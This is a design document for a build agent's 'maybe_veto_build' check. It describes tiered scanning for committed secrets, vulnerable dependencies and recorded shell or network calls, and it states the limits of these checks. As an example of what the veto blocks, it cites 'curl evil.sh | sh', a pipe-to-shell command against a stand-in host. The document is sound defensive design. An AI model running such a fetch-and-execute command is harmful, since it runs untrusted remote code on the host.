# Veto alternates — how `maybe_veto_build` decides

Status: **design** (one tiny tier-A veto is implemented in `tools/aeb-agent`;
the rest is design). Companion to
[`run-policy-class-and-cloud-leverage.md`](run-policy-class-and-cloud-leverage.md)
(the sovereign-agent + policy-class design). This doc is specifically about
*how* a remote `aeb-agent` decides, on its own authority, whether to build a
prepared tree — `maybe_veto_build`.

(Disambiguation: the policy-class doc also says "veto", but that's the
*token/claim* veto — refusing an unauthenticated or over-scoped dispatch at
the door. This doc is the *build-content* veto — having authenticated and
prepared the tree, does the agent's policy permit *this build* to run. Two
different gates: auth-veto at the door, build-veto after prepare.)

## SCOPE — read this first, it's the whole point

These vetoes guard against **build-grammar escapes**: things the
`.build.ae` / `.tests.ae` *orchestration* does that the agent operator
doesn't want a leased node to do — shell out to something dangerous, reach
the network, pull a banned/known-vulnerable dependency, write outside the
workdir, embed a secret in the tree, dispatch onward.

They do **NOT** guard against **the application being built being a trojan.**
Nothing here inspects, or can vouch for, the runtime behaviour of the
*compiled artifact*. A `.build.ae` that cleanly runs `javac` on Java source
passes every veto in this doc — and that Java can still be malware. The
veto sees *the build's intent*, not *the program's intent*.

Stated bluntly so no one mistakes it:

> **In scope:** "this *build* would `curl evil.sh | sh`, or link a CVE'd
> dependency, or write to `/etc`." → vetoable here.
>
> **Out of scope:** "the binary this build produces exfiltrates data when
> run." → NOT addressed here. That needs artifact scanning / SBOM /
> sandboxed *execution* of the output, which is a different problem with
> different (and weaker) guarantees.

Conflating the two is how a veto framework manufactures false confidence.
A green `maybe_veto_build` means *the build process was acceptable to the
agent operator* — it says nothing about whether the software is safe to
run. Keep that line bright.

## The veto pipeline: three complementary tiers

`maybe_veto_build(repo, target, purpose)` runs an ordered list of checks;
any one may refuse. They differ by *what they inspect* and *what they cost*.

### Tier A — tree scan (cheap, pre-everything)

Grep/inspect the prepared tree (post-checkout, post-patch) for obvious
red flags before any compile: committed secrets/private keys, banned
files, oversize trees, files outside an allowed set. Implemented today as
a single conservative example (a `BEGIN RSA PRIVATE KEY` marker scan) — the
placeholder seam. Fast, dumb, catches the blatant. A hit on the *patch*
specifically is the highest-signal case (the untrusted pre-integration
delta introduced it).

### Tier B — resolved-coordinate / SBOM meta (the dependency-CVE tier)

Inspect the **resolved third-party closure** — the exact
`group:artifact:version` set aeb already computes (`aeb-resolve.jar` /
pnpm / cargo / NuGet) plus the `build.dep(...)` edge graph aeb extracts
statically (`tools/extract-deps`, `target/_aeb/_edges.txt`). A veto here
asks "does this build pull a known-vulnerable or banned dependency?" —
against structured coordinates, NOT a regex over `pom.xml`. This is where
OWASP-style dependency checks live. aeb *already produces* most of the
input; it needs a resolve-only / meta-emit mode so the veto can read the
closure without doing a full build. (See the "structured outputs" item in
TODO.md § Test result reporting for the adjacent plumbing.)

### Tier C — doppelganger-compile trace (the build-grammar-intent tier)

**The interesting one, and the one this doc exists to capture.** Compile
the target against a *doppelganger* `build` / `aether` / language SDK that,
instead of *executing* the build, **records what the build would do** — its
`os.system` calls, `dep()` edges, `link_flag`s, `extra_source`s, codegen,
any `std.net`/`std.http` reach. The veto then inspects that **structured
recorded intent** ("this build would `os.system('curl …')`", "would link
`libsketchy.so`", "would reach 1.2.3.4") rather than regexing source.

#### Why aeb can do this cheaply (the Action!/Interface-Builder trick)

This is the same move as Denison Bollay's Action! (1988): interpret the
*same source* into an *alternate context* — and Paul's tsyne WYSIWYG
designer, which interprets a `.ts` UI script into a doppelganger Tsyne API
that records widget metadata instead of drawing widgets
(`tsyne/designer`). Provenance:
- Action! — paulhammant.com 2013-03-28, "Interface Builder's Alternative
  Lisp timeline": *"saved in Lisp, and interpreted the same on load … into
  a context."*
- tsyne designer — `designer/README.md`: *"the designer interprets the
  to-be-designed .ts script into designer's own emulation of Tsyne's
  TypeScript API."*

The tsyne designer pays an **impedance cost** for the trick: it
`tsc`-transpiles the script then *regex-rewrites the transpiled output* to
swap `require("tsyne")` → `global.designer` (fragile — it depends on how
`tsc` happens to emit import aliases; see `designer/src/server.ts`
~1057–1098). **aeb pays no such cost.** Which SDK an `.ae` imports is
purely the `--lib` search path — so swapping in a doppelganger is just
`aetherc --lib <doppelganger-lib>`. Same source, different library, **zero
source/output rewriting.** aeb has, via `--lib`, the clean "interpret into
an alternate context" that the homoiconic Lisp case had natively and the
TypeScript case has to fake. The pieces already exist: multi-`--lib`
resolution (the `aeblabel`/`AEB_COMPILE_LIB` work) and the
`maybe_veto_build` seam to host the trace inspection.

#### What tier C is, precisely — and its honest limits

It is **dynamic abstract interpretation of the build orchestration.** It
faithfully traces *what the `.build.ae` declares/reaches on the path taken*.
It is **not** a soundness proof, and three limits must be stated or it will
be over-trusted:

1. **Orchestration only, never the app.** Tier C sees "the build runs
   `javac` on these files" — never what the *compiled Java* does. (This is
   the SCOPE boundary above, restated at the mechanism level. The whole
   doppelganger sees the build-grammar layer; the trojan-in-the-output is
   invisible to it by construction.)
2. **One path, not all paths.** A `.build.ae` with `if env(X) { sys(a) }
   else { sys(b) }` records the branch *this run* takes. You get *a* trace,
   not *every* trace — the standard dynamic-analysis limitation. Sound
   coverage would need symbolic/abstract walking, a much larger thing.
3. **Opaque computation defeats understanding (but not detection).** A
   `.build.ae` doing `os.system(decode(blob))` records
   `os.system(<computed string>)` — the veto can still flag "opaque/
   computed command → veto" as policy, but it cannot always *read* what
   would run. Treat opacity itself as a vetoable signal.

So tier C is a **strong veto input for build-grammar escapes**, not a
guarantee. "The build declared nothing I forbid, on the path it took" — a
real, useful statement, within its stated limits.

## How the tiers compose

```
maybe_veto_build(repo, target, purpose):
  A. tree scan            (raw tree; cheap; pre-compile)        — implemented (stub)
  B. resolved-dep / SBOM  (structured coordinates; needs resolve) — design
  C. doppelganger trace   (--lib swap; records build intent)      — design
  → first refusal wins → {status:"vetoed", reason}; no build runs
```

- Run cheap→expensive (A, then B, then C) so a blatant tier-A hit short-
  circuits before the costly resolve/doppelganger work.
- The veto **list is pluggable** — each tier is N rules; OWASP/CVE is a
  tier-B rule, "no network reach" / "no shell-out outside an allowlist" are
  tier-C rules, "no committed secret" is a tier-A rule. New rules slot in
  without reshaping `maybe_veto_build`.
- Veto rules are **the agent operator's policy**, not the requester's — and
  may be keyed by the dispatch's policy class (a `ci` dispatch stricter
  than a `preint` one), per the policy-class doc.
- A vetoed dispatch is **a refusal, not a build failure** — distinct
  status (`vetoed`, HTTP 422), so the originator can tell "your build was
  refused on policy" from "your build ran and failed."

## What to build, in order

1. **Tier A is in.** Generalize the single stub scan into a small rule list
   (secret patterns, banned files, size cap, patch-touches-disallowed-path).
2. **Tier C spike** — a doppelganger `lib/build` (and key language SDKs)
   whose builders record `os.system`/`dep`/`link_flag`/codegen calls
   instead of executing, run via `aetherc --lib <doppelganger>`; emit the
   trace as JSON; a veto reads it. This is the high-value, aeb-unique tier
   (the `--lib` trick) and the natural evolution of the meta-for-veto idea.
3. **Tier B** — a `--resolve-only` / meta-emit mode so the resolved
   coordinate closure is available to a CVE/banned-dep veto without a full
   build; wire an OWASP-style check as the first tier-B rule.

## The one-line summary

`maybe_veto_build` guards the **build's behaviour**, tier C does it with the
Action!/designer "interpret into a doppelganger via `--lib`" trick (cheap
in aeb because `--lib` swaps the library with no impedance) — but it guards
**build-grammar escapes, never the application being built.** A clean veto
is not a clean program. Keep that boundary bright.
